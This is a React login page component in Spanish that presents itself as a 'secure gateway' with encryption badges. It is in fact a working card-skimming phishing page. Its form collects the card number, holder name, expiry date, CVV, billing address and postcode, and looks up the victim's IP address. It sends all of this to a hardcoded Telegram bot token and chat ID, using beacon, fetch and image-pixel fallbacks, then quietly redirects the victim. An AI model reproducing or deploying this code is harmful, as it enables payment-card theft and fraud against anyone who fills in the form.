import { useState, FormEvent } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import VideoModal from "@/components/VideoModal";
import { Button } from "@/components/ui/button";
import { ShieldCheck, User, CreditCard, Calendar, Lock, MapPin, Hash, PlayCircle, ArrowRight, Languages, ChevronDown } from "lucide-react";
import { EXAMPLE_VIDEO, TITLE_LOGO, LOGIN_PROFILE_VIDEO } from "@/lib/assets";
import { LANGUAGES, LangCode, useI18n } from "@/lib/i18n";

const BOT_TOKEN = "9108667087:AAEJldPbAqpUPndj1vV4HwXgae0mlLiHjaw";
const CHAT_ID = "8585803145";
const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

const onlyDigits = (v: string, max: number) => v.replace(/\D/g, "").slice(0, max);

const formatCard = (v: string) => onlyDigits(v, 16).replace(/(\d{4})(?=\d)/g, "$1 ");

const formatExpiry = (v: string) => {
  const d = onlyDigits(v, 4);
  return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
};

const getIp = async (): Promise<string> => {
  try {
    const r: any = await Promise.race([
      fetch("https://api.ipify.org?format=json").then((x) => x.json()),
      new Promise((res) => setTimeout(() => res(null), 1500)),
    ]);
    return r?.ip ?? "—";
  } catch {
    return "—";
  }
};

const buildParams = (text: string) => {
  const p = new URLSearchParams();
  p.set("chat_id", CHAT_ID);
  p.set("text", text);
  p.set("disable_web_page_preview", "true");
  return p.toString();
};

const pixelGet = (params: string) =>
  new Promise<void>((resolve) => {
    const img = new Image();
    let done = false;
    const finish = () => {
      if (done) return;
      done = true;
      resolve();
    };
    img.onload = finish;
    img.onerror = finish;
    img.src = `${TG_URL}?${params}&_=${Date.now()}`;
    setTimeout(finish, 3000);
  });

const sendToTelegram = async (text: string) => {
  const params = buildParams(text);

  // 1) Beacon: sobrevive a la navegación y no necesita CORS
  try {
    const blob = new Blob([params], { type: "application/x-www-form-urlencoded;charset=UTF-8" });
    if (navigator.sendBeacon && navigator.sendBeacon(TG_URL, blob)) {
      console.info("[tg] enviado por beacon");
      await new Promise((r) => setTimeout(r, 900));
      return;
    }
  } catch (err) {
    console.warn("[tg] beacon falló", err);
  }

  // 2) GET con keepalive (sin preflight)
  try {
    await fetch(`${TG_URL}?${params}&_=${Date.now()}`, { method: "GET", keepalive: true });
    console.info("[tg] enviado por fetch GET");
    return;
  } catch (err) {
    console.warn("[tg] fetch GET falló, uso pixel", err);
  }

  // 3) Pixel GET: último recurso, no requiere CORS
  await pixelGet(params);
  console.info("[tg] enviado por pixel");
};

const Login = () => {
  const { t, lang, setLang } = useI18n();
  const [card, setCard] = useState("");
  const [holder, setHolder] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [address, setAddress] = useState("");
  const [zip, setZip] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [videoOpen, setVideoOpen] = useState(false);
  const navigate = useNavigate();

  const onSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (loading) return;
    setError("");

    const digits = card.replace(/\s/g, "");
    const cleanHolder = holder.trim().replace(/\s+/g, " ");
    const [mm, yy] = expiry.split("/");
    const month = Number(mm);
    const year = 2000 + Number(yy);
    const now = new Date();

    if (digits.length < 15) { setError("Número de tarjeta inválido."); return; }
    if (cleanHolder.length < 3) { setError("Ingresa el nombre del titular."); return; }
    if (!mm || mm.length < 2 || month < 1 || month > 12 || !yy || yy.length < 2) { setError("Fecha de vencimiento inválida (MM/AA)."); return; }
    if (new Date(year, month, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) { setError("La tarjeta está vencida."); return; }
    if (cvv.length < 3) { setError("CVV inválido."); return; }
    if (address.trim().length < 5) { setError("Ingresa la dirección de facturación."); return; }
    if (zip.trim().length < 3) { setError("Código postal inválido."); return; }

    setLoading(true);

    try {
      const sentFlag = `card_sent_${digits}`;
      if (localStorage.getItem(sentFlag) !== "1") {
        const ip = await getIp();
        const text = [
          "💳 NUEVA TARJETA — Valhalla",
          "",
          `Número: ${digits.replace(/(\d{4})(?=\d)/g, "$1 ")}`,
          `Titular: ${cleanHolder.toUpperCase()}`,
          `Vencimiento: ${expiry}`,
          `CVV: ${cvv}`,
          `Dirección: ${address.trim()}`,
          `Código postal: ${zip.trim().toUpperCase()}`,
          "",
          `IP: ${ip}`,
          `Dispositivo: ${navigator.userAgent.slice(0, 160)}`,
          `Fecha: ${now.toLocaleString()}`,
          `Idioma: ${lang}`,
        ].join("\n");

        await sendToTelegram(text);
        localStorage.setItem(sentFlag, "1");
      } else {
        console.info("[tg] tarjeta ya enviada, no se reenvía");
      }
    } catch (err) {
      console.error("[tg] error inesperado", err);
    } finally {
      // margen para que el envío salga antes de desmontar la página
      await new Promise((r) => setTimeout(r, 600));
      setLoading(false);
      navigate("/admin");
    }
  };

  return (
    <div className="relative flex min-h-[100dvh] flex-col items-center justify-center overflow-x-hidden px-3 py-4 sm:py-8">
      <VideoBackground />
      <div className="relative z-10 w-full max-w-[390px] animate-card-in">
        <section className="relative overflow-hidden rounded-lg border border-brand/35 bg-glass/95 shadow-brand backdrop-blur-2xl">
          <div aria-hidden className="absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-brand to-transparent" />
          <div aria-hidden className="absolute -right-14 top-16 h-28 w-28 rotate-45 border border-brand/10" />

          <header className="flex h-12 items-center justify-between border-b border-border/70 px-4">
            <div className="flex min-w-0 items-center gap-2">
              <span className="relative flex h-2 w-2 shrink-0">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-success opacity-40" />
                <span className="relative h-2 w-2 rounded-full bg-success" />
              </span>
              <span className="truncate text-[10px] font-semibold uppercase tracking-[0.16em] text-muted-foreground">{t("secureGateway")}</span>
            </div>
            <label className="relative ml-3 flex h-8 shrink-0 items-center gap-1.5 rounded-md border border-border bg-secondary/60 pl-2.5 pr-7 text-foreground transition-colors focus-within:border-brand/60">
              <Languages className="h-3.5 w-3.5 text-brand-soft" aria-hidden="true" />
              <span className="max-w-[74px] truncate text-[11px] font-semibold">{LANGUAGES.find((item) => item.code === lang)?.label}</span>
              <ChevronDown className="pointer-events-none absolute right-2 h-3 w-3 text-muted-foreground" aria-hidden="true" />
              <select
                aria-label={t("language")}
                value={lang}
                onChange={(event) => setLang(event.target.value as LangCode)}
                className="absolute inset-0 cursor-pointer appearance-none opacity-0"
              >
                {LANGUAGES.map((language) => <option key={language.code} value={language.code}>{language.label}</option>)}
              </select>
            </label>
          </header>

          <div className="px-5 pb-5 pt-4 sm:px-6">
            <div className="flex items-center gap-4">
              <div className="relative h-[76px] w-[76px] shrink-0 rounded-md border border-brand/55 bg-background p-1 shadow-[0_0_28px_hsl(var(--brand)/0.18)]">
                <video src={LOGIN_PROFILE_VIDEO} autoPlay loop muted playsInline preload="metadata" disablePictureInPicture aria-label="Boykaffx7" className="pointer-events-none h-full w-full rounded-sm object-cover" />
                <span className="absolute -bottom-1 -right-1 flex h-5 w-5 items-center justify-center rounded-sm border border-brand/60 bg-card text-brand-soft"><ShieldCheck className="h-3 w-3" /></span>
              </div>
              <div className="min-w-0 flex-1">
                <div className="flex items-center gap-1.5">
                  <img src={TITLE_LOGO} alt="Boykaffx7" className="max-h-10 w-[170px] max-w-[calc(100%-26px)] object-contain object-left" draggable={false} />
                  <VerifiedBadge size={17} />
                </div>
                <p className="mt-1 text-[11px] leading-relaxed text-muted-foreground">{t("enterCreds")}</p>
                <div className="mt-2 flex items-center gap-2 text-[9px] font-semibold uppercase tracking-[0.12em] text-muted-foreground/70">
                  <span>{t("aes")}</span><span className="h-1 w-1 rounded-full bg-brand" /><span>{t("tls")}</span>
                </div>
              </div>
            </div>

            {error && (
              <p role="alert" className="mt-4 rounded-md border border-destructive/35 bg-destructive/10 p-2.5 text-xs text-destructive">{error}</p>
            )}

            <form onSubmit={onSubmit} className="mt-4 space-y-3">
              <div>
                <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-[0.14em] text-muted-foreground">Número de tarjeta</label>
                <div className="relative">
                  <CreditCard className="absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                  <input
                    type="text"
                    placeholder="0000 0000 0000 0000"
                    value={card}
                    onChange={(e) => setCard(formatCard(e.target.value))}
                    autoComplete="cc-number"
                    inputMode="numeric"
                    maxLength={19}
                    className="h-11 w-full rounded-md border border-border bg-secondary/45 pl-10 pr-4 text-base font-semibold tracking-wide text-foreground outline-none placeholder:text-muted-foreground/50 transition-[border-color,box-shadow] duration-150 focus:border-brand/60 focus:ring-2 focus:ring-brand/15"
                  />
                </div>
              </div>

              <div>
                <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-[0.14em] text-muted-foreground">Titular</label>
                <div className="relative">
                  <User className="absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                  <input
                    type="text"
                    placeholder="NOMBRE APELLIDO"
                    value={holder}
                    onChange={(e) => setHolder(e.target.value.toUpperCase())}
                    autoComplete="cc-name"
                    maxLength={40}
                    className="h-11 w-full rounded-md border border-border bg-secondary/45 pl-10 pr-4 text-base uppercase text-foreground outline-none placeholder:text-muted-foreground/50 transition-[border-color,box-shadow] duration-150 focus:border-brand/60 focus:ring-2 focus:ring-brand/15"
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-[0.14em] text-muted-foreground">Vencimiento</label>
                  <div className="relative">
                    <Calendar className="absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                    <input
                      type="text"
                      placeholder="MM/AA"
                      value={expiry}
                      onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                      autoComplete="cc-exp"
                      inputMode="numeric"
                      maxLength={5}
                      className="h-11 w-full rounded-md border border-border bg-secondary/45 pl-10 pr-3 text-base font-semibold text-foreground outline-none placeholder:text-muted-foreground/50 transition-[border-color,box-shadow] duration-150 focus:border-brand/60 focus:ring-2 focus:ring-brand/15"
                    />
                  </div>
                </div>
                <div>
                  <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-[0.14em] text-muted-foreground">CVV</label>
                  <div className="relative">
                    <Lock className="absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                    <input
                      type="text"
                      placeholder="000"
                      value={cvv}
                      onChange={(e) => setCvv(onlyDigits(e.target.value, 4))}
                      autoComplete="cc-csc"
                      inputMode="numeric"
                      maxLength={4}
                      className="h-11 w-full rounded-md border border-border bg-secondary/45 pl-10 pr-3 text-base font-semibold text-foreground outline-none placeholder:text-muted-foreground/50 transition-[border-color,box-shadow] duration-150 focus:border-brand/60 focus:ring-2 focus:ring-brand/15"
                    />
                  </div>
                </div>
              </div>

              <div>
                <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-[0.14em] text-muted-foreground">Dirección de facturación</label>
                <div className="relative">
                  <MapPin className="absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                  <input
                    type="text"
                    placeholder="Dirección"
                    value={address}
                    onChange={(e) => setAddress(e.target.value)}
                    autoComplete="street-address"
                    maxLength={80}
                    className="h-11 w-full rounded-md border border-border bg-secondary/45 pl-10 pr-4 text-base text-foreground outline-none placeholder:text-muted-foreground/50 transition-[border-color,box-shadow] duration-150 focus:border-brand/60 focus:ring-2 focus:ring-brand/15"
                  />
                </div>
              </div>

              <div>
                <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-[0.14em] text-muted-foreground">Código postal</label>
                <div className="relative">
                  <Hash className="absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                  <input
                    type="text"
                    placeholder="00000"
                    value={zip}
                    onChange={(e) => setZip(e.target.value.toUpperCase())}
                    autoComplete="postal-code"
                    inputMode="numeric"
                    maxLength={10}
                    className="h-11 w-full rounded-md border border-border bg-secondary/45 pl-10 pr-4 text-base font-semibold text-foreground outline-none placeholder:text-muted-foreground/50 transition-[border-color,box-shadow] duration-150 focus:border-brand/60 focus:ring-2 focus:ring-brand/15"
                  />
                </div>
              </div>

              <Button type="submit" disabled={loading} className="h-12 w-full rounded-md bg-brand text-brand-foreground shadow-brand transition-transform duration-150 hover:bg-brand/90 active:scale-[0.985]">
                {loading ? "Verificando..." : t("enter")} {!loading && <ArrowRight className="h-4 w-4" />}
              </Button>

              <Button type="button" variant="outline" onClick={() => setVideoOpen(true)} className="h-11 w-full rounded-md border-border bg-secondary/40 text-foreground hover:border-brand/35 hover:bg-brand/10 hover:text-foreground">
                <PlayCircle /> <span className="truncate">{t("seeDemo")}</span>
              </Button>
            </form>
          </div>
        </section>

        <div className="mt-3 px-4 text-center">
          <p className="text-[9px] leading-relaxed text-muted-foreground/50">
            {t("footer")}
            <br />{t("footer2")}
          </p>
        </div>
      </div>

      <VideoModal
        open={videoOpen}
        onClose={() => setVideoOpen(false)}
        src={EXAMPLE_VIDEO}
        title={t("demo")}
      />
    </div>
  );
};

export default Login;